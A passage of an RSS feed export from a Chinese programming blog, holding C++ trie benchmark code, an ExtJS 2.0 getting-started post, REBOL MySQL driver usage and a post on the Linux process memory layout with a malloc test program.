for(int i=0;i&lt;M;i++)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; treefind(&amp;root, tmp);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; clock_t t3 = clock();<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;N;i++){<br>&nbsp;&nbsp;&nbsp; indexfind(&amp;root, word);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; clock_t t4 = clock();<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;N;i++){<br>&nbsp;&nbsp;&nbsp; treefind(&amp;root, word);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; clock_t t5 = clock();<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;(t2-t1)&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;(t3-t2)&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;(t4-t3)&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;(t5-t4)&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>void indexadd(node *root, char *word){<br>&nbsp;&nbsp;&nbsp; node *prev, *p, *cur = root;<br>&nbsp;&nbsp;&nbsp; for(; *word; word++){<br>&nbsp;&nbsp;&nbsp; if(cur-&gt;first == NULL){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur-&gt;first = new node(*word);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur-&gt;used++;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur = cur-&gt;first;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; for(p = cur-&gt;first; p; prev=p,p=p-&gt;next){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(p-&gt;value == *word){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur = p;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if(p==NULL){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; prev-&gt;next = new node(*word);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur-&gt;used++;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur = prev-&gt;next;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; cur-&gt;isword=true;<br>}<br>void index2tree(node *cur){<br>&nbsp;&nbsp;&nbsp; if(cur==NULL) return ;<br>&nbsp;&nbsp;&nbsp; cur-&gt;size = hashfactor(cur-&gt;used);<br>&nbsp;&nbsp;&nbsp; cur-&gt;sons = new node*[cur-&gt;size];<br>&nbsp;&nbsp;&nbsp; memset((void*)cur-&gt;sons, 0, sizeof(node *)*cur-&gt;size);<br>&nbsp;&nbsp;&nbsp; for(node *p = cur-&gt;first; p; p=p-&gt;next){<br>&nbsp;&nbsp;&nbsp; int key=treehash(cur, p-&gt;value);<br>&nbsp;&nbsp;&nbsp; for(node *pos=cur-&gt;sons[key]; pos!=NULL; )<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; pos=cur-&gt;sons[(++key)%cur-&gt;size];<br>&nbsp;&nbsp;&nbsp; cur-&gt;sons[key%cur-&gt;size]=p;<br>&nbsp;&nbsp;&nbsp; index2tree(p);<br>&nbsp;&nbsp;&nbsp; }<br>}<br>bool indexfind(node *root, char *word){<br>&nbsp;&nbsp;&nbsp; node *p, *cur = root;<br>&nbsp;&nbsp;&nbsp; for(; *word; word++){<br>&nbsp;&nbsp;&nbsp; for(p=cur-&gt;first; p; p=p-&gt;next){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(p-&gt;value == *word){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur = p;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if(p==NULL)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return p==NULL ? false : p-&gt;isword;<br>}<br>bool treefind(node *root, char *word){<br>&nbsp;&nbsp;&nbsp; node *p, *cur = root;<br>&nbsp;&nbsp;&nbsp; for(; *word; word++){<br>&nbsp;&nbsp;&nbsp; int key=treehash(cur, *word);<br>&nbsp;&nbsp;&nbsp; for(p=cur-&gt;sons[key]; p; p=cur-&gt;sons[(++key)%cur-&gt;size]){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(p-&gt;value == *word){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur = p;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if(p==NULL)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return p==NULL ? false : cur-&gt;isword;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201092795135106/</guid>
    </item>
    <item>
      <title>
<![CDATA[ExtJS2.0入门]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200832312138698/</link>
      <description>
<![CDATA[<P>ExtJS是一个用javascript编写，与后台技术无关的前端ajax框架。因此，可以把ExtJS用在.Net、Java、Php等各种开发语言开发的应用中。开始基于yahooUI，后来独立了。</P>  <P>首先从官方网站下载ExtJS <A rel="nofollow" href="http://extjs.com/download/"  >http://extjs.com/download/</A>&nbsp;,下载的extjs2.0.zip，解压缩后的几个文件夹为：</P>  <P>adapter：负责将里面提供第三方底层库（包括Ext自带的底层库）映射为Ext所支持的底层库。<BR>build：&nbsp; 压缩后的ext全部源码(里面分类存放)。 <BR>docs：&nbsp; API帮助文档。<BR>exmaples：提供使用ExtJs技术做出的小实例。<BR>resources：Ext UI资源文件目录，如CSS、图片文件都存放在这里面。<BR>source： 无压缩Ext全部的源码(里面分类存放) 遵从Lesser GNU （LGPL） 开源的协议。<BR>Ext-all.js：压缩后的Ext全部源码。<BR>ext-all-debug.js：无压缩的Ext全部的源码(用于调试)。<BR>ext-core.js：压缩后的Ext的核心组件，包括sources/core下的所有类。<BR>ext-core-debug.js：无压缩Ext的核心组件，包括sources/core下的所有类。</P>  <P>开始，test.html</P>  <P>&lt;html&gt;&lt;head&gt;<BR>&lt;link rel="stylesheet" type="text/css" href="../ext2/resources/css/ext-all.css" /&gt; <BR>&lt;script type="text/javascript" src="../ext2/adapter/ext/ext-base.js"&gt;&lt;/script&gt;<BR>&lt;script type="text/javascript" src="../ext2/ext-all.js"&gt;&lt;/script&gt;<BR>&lt;script&gt; <BR>function fn() <BR>{<BR>&nbsp;alert('ExtJS&iquest;&acirc;&Ograve;&Ntilde;&frac14;&Oacute;'); <BR>}<BR>Ext.onReady(fn); <BR>&lt;/script&gt;<BR>&lt;/head&gt;<BR>进入<A rel="nofollow" href="http://localhost:8080/test/ext2/docs/"  >http://localhost:8080/test/ext2/docs/</A>&nbsp;或 samples查看更多<BR></P>  <P>&nbsp;</P>  <P><BR>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>JavaScript</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200832312138698/</guid>
    </item>
    <item>
      <title>
<![CDATA[在REBOL中使用mysql]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720084594559966/</link>
      <description>
<![CDATA[<P>一个牛人写的mysql驱动，去这里下载：（网易硬盘里有一个备份）。</P>  <P><A rel="nofollow" href="http://softinnov.org/rebol/mysql.shtml"  >http://softinnov.org/rebol/mysql.shtml</A></P>  <P>解压缩到local文件夹下</P>  <P>&gt;&gt; do %local/mysql-driver/mysql-protocol.r<BR>&gt;&gt; db: open mysql://root:851017@localhost/test<BR>&gt;&gt; print send-sql db "select * from test"</P>  <P>语法：</P><PRE>db: open mysql://[[user][:pass]@]host[:port]/database</PRE><PRE>insert port data</PRE><PRE>insert db "INSERT INTO mybooks VALUES ('Elan', 'REBOL Official Guide')"  insert db {CREATE TABLE products (      name        VARCHAR(100),      version     DECIMAL(2, 2),      released    DATE  )}</PRE><PRE>insert db read %setup.sql   ;-- execute a big SQL file</PRE><PRE>insert db ["INSERT INTO mybooks VALUES (?,?)" author title]</PRE><PRE>insert db [shutdown]</PRE><PRE>probe copy/part db 3    ; get 3 records  probe first db          ; get just 1 record  probe copy db           ; get all remaining records</PRE><PRE>close port</PRE><PRE>详见：<A rel="nofollow" href="http://softinnov.org/rebol/mysql-usage.html#sect6.2"  >http://softinnov.org/rebol/mysql-usage.html#sect6.2</A>.</PRE>  <P></P><PRE>&nbsp;</PRE>  <P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720084594559966/</guid>
    </item>
    <item>
      <title>
<![CDATA[Linux内存模型]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008102102741205/</link>
      <description>
<![CDATA[<span lang="EN-US"><p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3"><font size="3"><span lang="EN-US"><font face="Times New Roman">Linux</font></span><span style="font-family: 宋体;">的内存模型，一般为：</span></font></font></font></p>
<table style="border: medium none ; border-collapse: collapse;" border="1" cellpadding="0" cellspacing="0">
    <tbody>
        <tr>
            <td style="border: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">地址</font></span></p>
            </td>
            <td style="border-color: windowtext windowtext windowtext rgb(212, 208, 200); border-top: 0.5pt solid windowtext; border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">作用</font></span></p>
            </td>
            <td style="border-color: windowtext windowtext windowtext rgb(212, 208, 200); border-top: 0.5pt solid windowtext; border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">说明</font></span></p>
            </td>
        </tr>
        <tr>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext; border-left: 0.5pt solid windowtext; border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman" size="3">&gt;=0xc000 0000</font></span></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">内核虚拟存储器</font></span></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">用户代码不可见区域</font></span></p>
            </td>
        </tr>
        <tr>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext; border-left: 0.5pt solid windowtext; border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman" size="3">&lt;0xc000 0000</font></span></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><font size="3"><span lang="EN-US"><font face="Times New Roman">Stack</font></span><span style="font-family: 宋体;">（用户栈）</span></font></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><font size="3"><span lang="EN-US"><font face="Times New Roman">ESP</font></span><span style="font-family: 宋体;">指向栈顶</span></font></p>
            </td>
        </tr>
        <tr>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext; border-left: 0.5pt solid windowtext; border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3">&nbsp;<span lang="EN-US"></span></font></font></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; background: silver none repeat scroll 0% 0%; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial; width: 142.05pt;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">↓<span lang="EN-US"></span></font></span></p>
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;" lang="EN-US"><font size="3">&nbsp;</font></span></p>
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">↑</font></span></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman"><font size="3">&nbsp;</font></font></span></p>
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">空闲内存</font></span></p>
            </td>
        </tr>
        <tr>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext; border-left: 0.5pt solid windowtext; border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman" size="3">&gt;=0x4000 0000</font></span></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">文件映射区</font></span></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3">&nbsp;<span lang="EN-US"></span></font></font></p>
            </td>
        </tr>
        <tr>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext; border-left: 0.5pt solid windowtext; border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman" size="3">&lt;0x4000 0000</font></span></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; background: rgb(179, 179, 179) none repeat scroll 0% 0%; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial; width: 142.05pt;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;" lang="EN-US"><font size="3">&nbsp;</font></span></p>
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;" lang="EN-US"><font size="3">&nbsp;</font></span></p>
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">↑</font></span></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman"><font size="3">&nbsp;</font></font></span></p>
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">空闲内存</font></span></p>
            <p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3">&nbsp;<span lang="EN-US"></span></font></font></p>
            </td>
        </tr>
        <tr>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext; border-left: 0.5pt solid windowtext; border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3">&nbsp;<span lang="EN-US"></span></font></font></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><font size="3"><span lang="EN-US"><font face="Times New Roman">Heap(</font></span><span style="font-family: 宋体;">运行时堆</span><span lang="EN-US"><font face="Times New Roman">)</font></span></font></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><font size="3"><span style="font-family: 宋体;">通过</span><span lang="EN-US"><font face="Times New Roman">brk/sbrk</font></span><span style="font-family: 宋体;">系统调用扩大堆，向上增长。</span></font></p>
            </td>
        </tr>
        <tr>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext; border-left: 0.5pt solid windowtext; border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3">&nbsp;<span lang="EN-US"></span></font></font></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><font size="3"><span lang="EN-US"><font face="Times New Roman">.data</font></span><span style="font-family: 宋体;">、</span><span lang="EN-US"><font face="Times New Roman">.bss(</font></span><span style="font-family: 宋体;">读写段</span><span lang="EN-US"><font face="Times New Roman">)</font></span></font></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">从可执行文件中加载</font></span></p>
            </td>
        </tr>
        <tr>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext; border-left: 0.5pt solid windowtext; border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman" size="3">&gt;=0x0804 8000</font></span></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><font size="3"><span lang="EN-US"><font face="Times New Roman">.init</font></span><span style="font-family: 宋体;">、</span><span lang="EN-US"><font face="Times New Roman">.text</font></span><span style="font-family: 宋体;">、</span><span lang="EN-US"><font face="Times New Roman">.rodata(</font></span><span style="font-family: 宋体;">只读段</span><span lang="EN-US"><font face="Times New Roman">)</font></span></font></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">从可执行文件中加载</font></span></p>
            </td>
        </tr>
        <tr>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext; border-left: 0.5pt solid windowtext; border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman" size="3">&lt;0x0804 8000</font></span></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font size="3">保留区域</font></span></p>
            </td>
            <td style="border-color: rgb(212, 208, 200) windowtext windowtext rgb(212, 208, 200); border-right: 0.5pt solid windowtext; border-bottom: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 142.05pt; background-color: transparent;" valign="top" width="189">
            <p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3">&nbsp;<span lang="EN-US"></span></font></font></p>
            </td>
        </tr>
    </tbody>
</table>
<p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman"><font size="3"><font face="Times New Roman"><font size="3">&nbsp;</font></font></font></font></span></p>
<p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3"><font size="3"><span style="font-family: 宋体;">很多书上都有类似的描述，本图取自于《深入理解计算机系统》</span><span lang="EN-US"><font face="Times New Roman">p603</font></span><span style="font-family: 宋体;">，略做修改。本图比较清析，很容易理解，但仍然有两点不足。下面补充说明一下：</span></font></font></font></p>
<p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman"><font size="3"><font size="3"><font face="Times New Roman">&nbsp;</font></font></font></font></span></p>
<p  style="margin: 0cm 0cm 0pt 21pt; text-indent: -21pt;"><span lang="EN-US"><font face="Times New Roman"><font size="3"><font face="Times New Roman"><font size="3">1.</font><span style="font-family: &quot;Times New Roman&quot;; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></font></font></font></span><font face="Times New Roman"><font size="3"><font size="3"><strong><span style="font-family: 宋体;">第一点是关于运行时堆的</span></strong><span style="font-family: 宋体;">。</span></font></font></font></p>
<p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font face="Times New Roman"><font size="3"><font size="3">为说明这个问题，我们先运行一个测试程序，并观察其结果：</font></font></font></span></p>
<table style="border: medium none ; border-collapse: collapse;" border="1" cellpadding="0" cellspacing="0">
    <tbody>
        <tr>
            <td style="border: 0.5pt solid windowtext; padding: 0cm 5.4pt; width: 426.1pt; background-color: transparent;" valign="top" width="568">
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: blue;" lang="EN-US">#include </span><span style="font-size: 10pt; color: black;" lang="EN-US">&lt;</span><span style="font-size: 10pt; color: rgb(160, 0, 160);" lang="EN-US">stdio</span><span style="font-size: 10pt; color: black;" lang="EN-US">.h&gt;</span></font></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><span style="font-size: 10pt; color: black;" lang="EN-US"><font face="Times New Roman">&nbsp;</font></span></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: blue;" lang="EN-US">int</span><span style="font-size: 10pt; color: black;" lang="EN-US"> </span><span style="font-size: 10pt; color: rgb(136, 0, 0);" lang="EN-US">main</span><span style="font-size: 10pt; color: black;" lang="EN-US">(</span><span style="font-size: 10pt; color: blue;" lang="EN-US">int</span><span style="font-size: 10pt; color: black;" lang="EN-US"> </span><span style="font-size: 10pt; color: gray;" lang="EN-US">argc</span><span style="font-size: 10pt; color: black;" lang="EN-US">, </span><span style="font-size: 10pt; color: blue;" lang="EN-US">char</span><span style="font-size: 10pt; color: black;" lang="EN-US">* </span><span style="font-size: 10pt; color: gray;" lang="EN-US">argv</span><span style="font-size: 10pt; color: black;" lang="EN-US">[])</span></font></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><span style="font-size: 10pt; color: black;" lang="EN-US"><font face="Times New Roman">{</font></span></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: black;" lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span><span style="font-size: 10pt; color: blue;" lang="EN-US">int</span><span style="font-size: 10pt; color: black;" lang="EN-US"><span style="">&nbsp; </span></span><span style="font-size: 10pt; color: gray;" lang="EN-US">first</span><span style="font-size: 10pt; color: black;" lang="EN-US"> = 0;</span></font></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: black;" lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span><span style="font-size: 10pt; color: blue;" lang="EN-US">int</span><span style="font-size: 10pt; color: black;" lang="EN-US">* </span><span style="font-size: 10pt; color: gray;" lang="EN-US">p0</span><span style="font-size: 10pt; color: black;" lang="EN-US"> = </span><span style="font-size: 10pt; color: rgb(136, 0, 0);" lang="EN-US">malloc</span><span style="font-size: 10pt; color: black;" lang="EN-US">(1024);</span></font></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: black;" lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span><span style="font-size: 10pt; color: blue;" lang="EN-US">int</span><span style="font-size: 10pt; color: black;" lang="EN-US">* </span><span style="font-size: 10pt; color: gray;" lang="EN-US">p1</span><span style="font-size: 10pt; color: black;" lang="EN-US"> = </span><span style="font-size: 10pt; color: rgb(136, 0, 0);" lang="EN-US">malloc</span><span style="font-size: 10pt; color: black;" lang="EN-US">(1024 * 1024);</span></font></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: black;" lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span><span style="font-size: 10pt; color: blue;" lang="EN-US">int</span><span style="font-size: 10pt; color: black;" lang="EN-US">* </span><span style="font-size: 10pt; color: gray;" lang="EN-US">p2</span><span style="font-size: 10pt; color: black;" lang="EN-US"> = </span><span style="font-size: 10pt; color: rgb(136, 0, 0);" lang="EN-US">malloc</span><span style="font-size: 10pt; color: black;" lang="EN-US">(512 * 1024 * 1024 );</span></font></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: black;" lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span><span style="font-size: 10pt; color: blue;" lang="EN-US">int</span><span style="font-size: 10pt; color: black;" lang="EN-US">* </span><span style="font-size: 10pt; color: gray;" lang="EN-US">p3</span><span style="font-size: 10pt; color: black;" lang="EN-US"> = </span><span style="font-size: 10pt; color: rgb(136, 0, 0);" lang="EN-US">malloc</span><span style="font-size: 10pt; color: black;" lang="EN-US">(1024 * 1024 * 1024 );</span></font></p>
